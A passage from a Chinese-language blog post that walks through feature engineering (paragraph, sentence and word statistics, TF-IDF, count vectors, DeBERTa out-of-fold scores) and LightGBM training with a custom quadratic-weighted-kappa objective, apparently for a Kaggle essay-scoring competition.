paragraph_fea2],</span><br><span class="line">        *[pl.col(fea).quantile(<span class="number">0.75</span>).alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_q3&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> paragraph_fea2],</span><br><span class="line">        ]</span><br><span class="line">    df = train_tmp.group_by([<span class="string">&#x27;essay_id&#x27;</span>], maintain_order=<span class="literal">True</span>).agg(aggs).sort(<span class="string">&quot;essay_id&quot;</span>)</span><br><span class="line">    df = df.to_pandas()</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line">tmp = Paragraph_Preprocess(train)</span><br><span class="line">train_feats = Paragraph_Eng(tmp)</span><br><span class="line">train_feats[<span class="string">&#x27;score&#x27;</span>] = train[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line"></span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], train_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Features Number: &#x27;</span>,<span class="built_in">len</span>(feature_names))</span><br><span class="line">train_feats.head(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Features Number:  53</span></span><br></pre></td></tr></table></figure><p>这时候特征数量来到了53</p><h3 id="第二波处理sentence">第二波处理(sentence)</h3><p>类似于paragraph</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Sentence_Preprocess</span>(<span class="params">tmp</span>):</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;full_text&#x27;</span>).map_elements(dataPreprocessing).<span class="built_in">str</span>.split(by=<span class="string">&quot;.&quot;</span>).alias(<span class="string">&quot;sentence&quot;</span>))</span><br><span class="line">    tmp = tmp.explode(<span class="string">&#x27;sentence&#x27;</span>)</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;sentence&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x)).alias(<span class="string">&quot;sentence_len&quot;</span>))</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;sentence&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x.split(<span class="string">&#x27; &#x27;</span>))).alias(<span class="string">&quot;sentence_word_cnt&quot;</span>))    </span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># feature_eng</span></span><br><span class="line">sentence_fea = [<span class="string">&#x27;sentence_len&#x27;</span>,<span class="string">&#x27;sentence_word_cnt&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sentence_Eng</span>(<span class="params">train_tmp</span>):</span><br><span class="line">    aggs = [</span><br><span class="line">        *[pl.col(<span class="string">&#x27;sentence&#x27;</span>).<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;sentence_len&#x27;</span>) &gt;= i).count().alias(<span class="string">f&quot;sentence_&gt;<span class="subst">&#123;i&#125;</span>_cnt&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">15</span>,<span class="number">50</span>,<span class="number">100</span>,<span class="number">150</span>,<span class="number">200</span>,<span class="number">250</span>,<span class="number">300</span>] ], </span><br><span class="line">        *[pl.col(<span class="string">&#x27;sentence&#x27;</span>).<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;sentence_len&#x27;</span>) &lt;= i).count().alias(<span class="string">f&quot;sentence_&lt;<span class="subst">&#123;i&#125;</span>_cnt&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">15</span>,<span class="number">50</span>] ], </span><br><span class="line">        *[pl.col(fea).<span class="built_in">max</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_max&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).mean().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_mean&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).<span class="built_in">min</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_min&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).<span class="built_in">sum</span>().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_sum&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).first().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_first&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).last().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_last&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).kurtosis().alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_kurtosis&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).quantile(<span class="number">0.25</span>).alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_q1&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">        *[pl.col(fea).quantile(<span class="number">0.75</span>).alias(<span class="string">f&quot;<span class="subst">&#123;fea&#125;</span>_q3&quot;</span>) <span class="keyword">for</span> fea <span class="keyword">in</span> sentence_fea],</span><br><span class="line">    </span><br><span class="line">        ]</span><br><span class="line">    df = train_tmp.group_by([<span class="string">&#x27;essay_id&#x27;</span>], maintain_order=<span class="literal">True</span>).agg(aggs).sort(<span class="string">&quot;essay_id&quot;</span>)</span><br><span class="line">    df = df.to_pandas()</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">tmp = Sentence_Preprocess(train)</span><br><span class="line">train_feats = train_feats.merge(Sentence_Eng(tmp), on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], train_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Features Number: &#x27;</span>,<span class="built_in">len</span>(feature_names))</span><br><span class="line">train_feats.head(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Features Number:  81</span></span><br></pre></td></tr></table></figure><h3 id="word">word</h3><p>然后对单词长度处理,个人感觉有点离谱了,不过就当先了解下可以做的处理了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># word feature</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Word_Preprocess</span>(<span class="params">tmp</span>):</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;full_text&#x27;</span>).map_elements(dataPreprocessing).<span class="built_in">str</span>.split(by=<span class="string">&quot; &quot;</span>).alias(<span class="string">&quot;word&quot;</span>))</span><br><span class="line">    tmp = tmp.explode(<span class="string">&#x27;word&#x27;</span>)</span><br><span class="line">    tmp = tmp.with_columns(pl.col(<span class="string">&#x27;word&#x27;</span>).map_elements(<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x)).alias(<span class="string">&quot;word_len&quot;</span>))</span><br><span class="line">    tmp = tmp.<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;word_len&#x27;</span>)!=<span class="number">0</span>)    </span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># feature_eng</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Word_Eng</span>(<span class="params">train_tmp</span>):</span><br><span class="line">    aggs = [</span><br><span class="line">        *[pl.col(<span class="string">&#x27;word&#x27;</span>).<span class="built_in">filter</span>(pl.col(<span class="string">&#x27;word_len&#x27;</span>) &gt;= i+<span class="number">1</span>).count().alias(<span class="string">f&quot;word_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>_cnt&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>) ], </span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).<span class="built_in">max</span>().alias(<span class="string">f&quot;word_len_max&quot;</span>),</span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).mean().alias(<span class="string">f&quot;word_len_mean&quot;</span>),</span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).std().alias(<span class="string">f&quot;word_len_std&quot;</span>),</span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).quantile(<span class="number">0.25</span>).alias(<span class="string">f&quot;word_len_q1&quot;</span>),</span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).quantile(<span class="number">0.50</span>).alias(<span class="string">f&quot;word_len_q2&quot;</span>),</span><br><span class="line">        pl.col(<span class="string">&#x27;word_len&#x27;</span>).quantile(<span class="number">0.75</span>).alias(<span class="string">f&quot;word_len_q3&quot;</span>),</span><br><span class="line">        ]</span><br><span class="line">    df = train_tmp.group_by([<span class="string">&#x27;essay_id&#x27;</span>], maintain_order=<span class="literal">True</span>).agg(aggs).sort(<span class="string">&quot;essay_id&quot;</span>)</span><br><span class="line">    df = df.to_pandas()</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">tmp = Word_Preprocess(train)</span><br><span class="line">train_feats = train_feats.merge(Word_Eng(tmp), on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], train_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Features Number: &#x27;</span>,<span class="built_in">len</span>(feature_names))</span><br><span class="line">train_feats.head(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Features Number:  102</span></span><br></pre></td></tr></table></figure><h3 id="tfidf">tfidf</h3><p>真没想到居然还是用得到这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">vectorizer = TfidfVectorizer(</span><br><span class="line">            tokenizer=<span class="keyword">lambda</span> x: x,</span><br><span class="line">            preprocessor=<span class="keyword">lambda</span> x: x,</span><br><span class="line">            token_pattern=<span class="literal">None</span>,</span><br><span class="line">            strip_accents=<span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">            analyzer = <span class="string">&#x27;word&#x27;</span>,</span><br><span class="line">            ngram_range=(<span class="number">3</span>,<span class="number">6</span>),</span><br><span class="line">            min_df=<span class="number">0.05</span>,</span><br><span class="line">            max_df=<span class="number">0.95</span>,</span><br><span class="line">            sublinear_tf=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">train_tfid = vectorizer.fit_transform([i <span class="keyword">for</span> i <span class="keyword">in</span> train[<span class="string">&#x27;full_text&#x27;</span>]])</span><br><span class="line">dense_matrix = train_tfid.toarray()</span><br><span class="line">df = pd.DataFrame(dense_matrix)</span><br><span class="line">tfid_columns = [ <span class="string">f&#x27;tfid_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]</span><br><span class="line">df.columns = tfid_columns</span><br><span class="line">df[<span class="string">&#x27;essay_id&#x27;</span>] = train_feats[<span class="string">&#x27;essay_id&#x27;</span>]</span><br><span class="line">train_feats = train_feats.merge(df, on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], train_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Number of Features: &#x27;</span>,<span class="built_in">len</span>(feature_names))</span><br><span class="line">train_feats.head(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Number of Features:  19729</span></span><br></pre></td></tr></table></figure><p>可以看到特征数量直接开始爆炸, 但tf-idf的老问题还是存在</p><p><img src="tf-idf.png" /></p><h3 id="count">count</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vectorizer_cnt = CountVectorizer(</span><br><span class="line">            tokenizer=<span class="keyword">lambda</span> x: x,</span><br><span class="line">            preprocessor=<span class="keyword">lambda</span> x: x,</span><br><span class="line">            token_pattern=<span class="literal">None</span>,</span><br><span class="line">            strip_accents=<span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">            analyzer = <span class="string">&#x27;word&#x27;</span>,</span><br><span class="line">            ngram_range=(<span class="number">2</span>,<span class="number">3</span>),</span><br><span class="line">            min_df=<span class="number">0.10</span>,</span><br><span class="line">            max_df=<span class="number">0.85</span>,</span><br><span class="line">)</span><br><span class="line">train_tfid = vectorizer_cnt.fit_transform([i <span class="keyword">for</span> i <span class="keyword">in</span> train[<span class="string">&#x27;full_text&#x27;</span>]])</span><br><span class="line">dense_matrix = train_tfid.toarray()</span><br><span class="line">df = pd.DataFrame(dense_matrix)</span><br><span class="line">tfid_columns = [ <span class="string">f&#x27;tfid_cnt_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]</span><br><span class="line">df.columns = tfid_columns</span><br><span class="line">df[<span class="string">&#x27;essay_id&#x27;</span>] = train_feats[<span class="string">&#x27;essay_id&#x27;</span>]</span><br><span class="line">train_feats = train_feats.merge(df, on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="整合deberta">整合deberta</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line">deberta_oof = joblib.load(<span class="string">&#x27;/kaggle/input/aes2-400-20240419134941/oof.pkl&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(deberta_oof.shape, train_feats.shape)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    train_feats[<span class="string">f&#x27;deberta_oof_<span class="subst">&#123;i&#125;</span>&#x27;</span>] = deberta_oof[:, i]</span><br><span class="line"></span><br><span class="line">feature_names = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;essay_id&#x27;</span>,<span class="string">&#x27;score&#x27;</span>], train_feats.columns))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Features Number: &#x27;</span>,<span class="built_in">len</span>(feature_names))    </span><br><span class="line"></span><br><span class="line">train_feats.shape</span><br></pre></td></tr></table></figure><h3 id="evaluation-metrics">evaluation metrics</h3><p>比赛给出的要求是会看quadratic weighted kappa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quadratic_weighted_kappa</span>(<span class="params">y_true, y_pred</span>):</span><br><span class="line">    y_true = y_true + a</span><br><span class="line">    y_pred = (y_pred + a).clip(<span class="number">1</span>, <span class="number">6</span>).<span class="built_in">round</span>()</span><br><span class="line">    qwk = cohen_kappa_score(y_true, y_pred, weights=<span class="string">&quot;quadratic&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;QWK&#x27;</span>, qwk, <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qwk_obj</span>(<span class="params">y_true, y_pred</span>):</span><br><span class="line">    labels = y_true + a</span><br><span class="line">    preds = y_pred + a</span><br><span class="line">    preds = preds.clip(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    f = <span class="number">1</span>/<span class="number">2</span>*np.<span class="built_in">sum</span>((preds-labels)**<span class="number">2</span>)</span><br><span class="line">    g = <span class="number">1</span>/<span class="number">2</span>*np.<span class="built_in">sum</span>((preds-a)**<span class="number">2</span>+b)</span><br><span class="line">    df = preds - labels</span><br><span class="line">    dg = preds - a</span><br><span class="line">    grad = (df/g - f*dg/g**<span class="number">2</span>)*<span class="built_in">len</span>(labels)</span><br><span class="line">    hess = np.ones(<span class="built_in">len</span>(labels))</span><br><span class="line">    <span class="keyword">return</span> grad, hess</span><br><span class="line">a = <span class="number">2.998</span></span><br><span class="line">b = <span class="number">1.092</span></span><br></pre></td></tr></table></figure><h3 id="整合数据丢lgbm">整合数据,丢LGBM</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/kaggle/input/aes2-400-fes-202404291649/usefe_list.pkl&#x27;</span>, mode=<span class="string">&#x27;br&#x27;</span>) <span class="keyword">as</span> fi:</span><br><span class="line">  feature_names = pickle.load(fi)</span><br><span class="line">feature_select = feature_names</span><br><span class="line"></span><br><span class="line">X = train_feats[feature_names].astype(np.float32).values</span><br><span class="line">y_split = train_feats[<span class="string">&#x27;score&#x27;</span>].astype(<span class="built_in">int</span>).values</span><br><span class="line">y = train_feats[<span class="string">&#x27;score&#x27;</span>].astype(np.float32).values-a</span><br><span class="line">oof = train_feats[<span class="string">&#x27;score&#x27;</span>].astype(<span class="built_in">int</span>).values</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n_splits = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">skf = StratifiedKFold(n_splits=n_splits, shuffle=<span class="literal">True</span>, random_state=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">f1_scores = []</span><br><span class="line">kappa_scores = []</span><br><span class="line">models = []</span><br><span class="line">predictions = []</span><br><span class="line">callbacks = [log_evaluation(period=<span class="number">25</span>), early_stopping(stopping_rounds=<span class="number">75</span>,first_metric_only=<span class="literal">True</span>)]</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> train_index, test_index <span class="keyword">in</span> skf.split(X, y_split):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;fold&#x27;</span>,i)</span><br><span class="line">    X_train_fold, X_test_fold = X[train_index], X[test_index]   </span><br><span class="line">    y_train_fold, y_test_fold, y_test_fold_int = y[train_index], y[test_index], y_split[test_index]</span><br><span class="line">    model = lgb.LGBMRegressor(</span><br><span class="line">                objective = qwk_obj,</span><br><span class="line">                metrics = <span class="string">&#x27;None&#x27;</span>,</span><br><span class="line">                learning_rate = <span class="number">0.05</span>,</span><br><span class="line">                max_depth = <span class="number">5</span>,</span><br><span class="line">                num_leaves = <span class="number">10</span>,</span><br><span class="line">                colsample_bytree=<span class="number">0.3</span>,</span><br><span class="line">                reg_alpha = <span class="number">0.7</span>,</span><br><span class="line">                reg_lambda = <span class="number">0.1</span>,</span><br><span class="line">                n_estimators=<span class="number">700</span>,</span><br><span class="line">                random_state=<span class="number">42</span>,</span><br><span class="line">                extra_trees=<span class="literal">True</span>,</span><br><span class="line">                class_weight=<span class="string">&#x27;balanced&#x27;</span>,</span><br><span class="line">                verbosity = - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    predictor = model.fit(X_train_fold,</span><br><span class="line">                                  y_train_fold,</span><br><span class="line">                                  eval_names=[<span class="string">&#x27;train&#x27;</span>, <span class="string">&#x27;valid&#x27;</span>],</span><br><span class="line">                                  eval_set=[(X_train_fold, y_train_fold), (X_test_fold, y_test_fold)],</span><br><span class="line">                                  eval_metric=quadratic_weighted_kappa,</span><br><span class="line">                                  callbacks=callbacks,)</span><br><span class="line">    models.append(predictor)</span><br><span class="line">    predictions_fold = predictor.predict(X_test_fold)</span><br><span class="line">    predictions_fold = predictions_fold + a</span><br><span class="line">    oof[test_index]=predictions_fold</span><br><span class="line">    predictions_fold = predictions_fold.clip(<span class="number">1</span>, <span class="number">6</span>).<span class="built_in">round</span>()</span><br><span class="line">    predictions.append(predictions_fold)</span><br><span class="line">    f1_fold = f1_score(y_test_fold_int, predictions_fold, average=<span class="string">&#x27;weighted&#x27;</span>)</span><br><span class="line">    f1_scores.append(f1_fold)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    kappa_fold = cohen_kappa_score(y_test_fold_int, predictions_fold, weights=<span class="string">&#x27;quadratic&#x27;</span>)</span><br><span class="line">    kappa_scores.append(kappa_fold)</span><br><span class="line">    </span><br><span class="line">    cm = confusion_matrix(y_test_fold_int, predictions_fold, labels=[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>)])</span><br><span class="line"></span><br><span class="line">    disp = ConfusionMatrixDisplay(confusion_matrix=cm,</span><br><span class="line">                                  display_labels=[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>)])</span><br><span class="line">    disp.plot()</span><br><span class="line">    plt.show()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;F1 score across fold: <span class="subst">&#123;f1_fold&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Cohen kappa score across fold: <span class="subst">&#123;kappa_fold&#125;</span>&#x27;</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">mean_f1_score = np.mean(f1_scores)</span><br><span class="line">mean_kappa_score = np.mean(kappa_scores)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Mean F1 score across <span class="subst">&#123;n_splits&#125;</span> folds: <span class="subst">&#123;mean_f1_score&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Mean Cohen kappa score across <span class="subst">&#123;n_splits&#125;</span> folds: <span class="subst">&#123;mean_kappa_score&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure><h3 id="test-data-prediction">test data prediction</h3><p>预处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tmp = Paragraph_Preprocess(test)</span><br><span class="line">test_feats = Paragraph_Eng(tmp)</span><br><span class="line"><span class="comment"># Sentence</span></span><br><span class="line">tmp = Sentence_Preprocess(test)</span><br><span class="line">test_feats = test_feats.merge(Sentence_Eng(tmp), on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="comment"># Word</span></span><br><span class="line">tmp = Word_Preprocess(test)</span><br><span class="line">test_feats = test_feats.merge(Word_Eng(tmp), on=<span class="string">&#x27;essay_id&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tfidf</span></span><br><span class="line">test_tfid = vectorizer.transform([i <span class="keyword">for</span> i <span class="keyword">in</span> test[<span class="string">&#x27;full_text&#x27;</span>]])</span><br><span class="line">dense_matrix = test_tfid.toarray()</span><br><span class="line">df = pd.DataFrame(dense_matrix)</span><br><span class="line">tfid_columns = 